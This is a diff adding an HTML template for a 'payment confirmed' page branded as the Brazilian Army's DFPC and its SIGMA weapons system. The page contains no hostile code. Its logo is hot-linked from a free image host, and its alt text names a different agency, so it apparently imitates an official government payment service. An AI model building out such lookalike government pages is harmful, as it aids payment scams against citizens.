@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SIGMA - Pagamento Confirmado</title>
+
+    <!-- Preload fonts -->
+    <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-400.woff2') }}" as="font" type="font/woff2" crossorigin>
+    <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-700.woff2') }}" as="font" type="font/woff2" crossorigin>
+
+    <!-- Styles -->
+    <link href="{{ url_for('static', filename='css/rawline.css') }}" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet">
+
+    <style>
+        body {
+            font-family: 'rawline', sans-serif;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+    </style>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'custom-blue': '#225BAC',
+                        'custom-yellow': '#F7CD04',
+                    }
+                }
+            }
+        }
+    </script>
+</head>
+<body class="bg-gray-50 min-h-screen flex flex-col">
+    <!-- Header -->
+    <div class="bg-white py-4">
+        <div class="container mx-auto px-4">
+            <div class="flex flex-col items-center text-center">
+                <img src="https://i.ibb.co/7RG7SfZ/MEAssinatura-1.png" alt="Logo of Secretaria de Estado de Economia" class="h-8 mb-2" />
+                <div>
+                    <p class="text-black text-[10px] leading-tight">
+                        EXÉRCITO BRASILEIRO
+                    </p>
+                    <p class="text-black text-[10px] leading-tight font-bold">
+                        COMANDO LOGÍSTICO - COLOG
+                    </p>
+                    <p class="text-black text-[10px] leading-tight">
+                        DIRETORIA DE FISCALIZAÇÃO DE PRODUTOS CONTROLADOS
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Blue bar -->
+    <div class="bg-custom-blue py-3 shadow-md">
+        <div class="container mx-auto px-4 flex items-center">
+            <button class="text-white text-2xl mr-4">
+                <div class="grid grid-cols-2 gap-0.5 drop-shadow-sm">
+                    <div class="w-2 h-2 bg-white"></div>
+                    <div class="w-2 h-2 bg-white"></div>
+                    <div class="w-2 h-2 bg-white"></div>
+                    <div class="w-1.5 h-1.5 bg-white"></div>
+                </div>
+            </button>
+            <span class="text-white text-xl drop-shadow-sm">PAGAMENTO CONFIRMADO</span>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="container mx-auto px-4 py-8 flex-grow">
+        <div class="max-w-md mx-auto">
+            <div class="bg-white rounded-lg shadow-md p-6">
+                <div class="flex flex-col items-center text-center">
+                    <div class="rounded-full bg-green-100 p-4 mb-4">
+                        <i class="fas fa-check-circle text-4xl text-green-500"></i>
+                    </div>
+                    <h1 class="text-2xl font-bold text-gray-800 mb-4">Pagamento Confirmado!</h1>
+                    <p class="text-gray-600 mb-6">
+                        Seu pagamento foi processado com sucesso. Obrigado por utilizar nossos serviços!
+                    </p>
+                    <a href="/" class="bg-custom-blue hover:bg-opacity-90 text-white font-bold py-2 px-6 rounded transition-colors">
+                        Voltar ao Início
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="bg-custom-blue text-white text-center py-3 mt-auto">
+        <p class="text-sm">© {{ current_year }} Exército Brasileiro - DFPC. Todos os direitos reservados.</p>
+        <p class="text-sm">SIGMA - Sistema de Gerenciamento Militar de Armas</p>
+    </div>
+</body>
+</html>
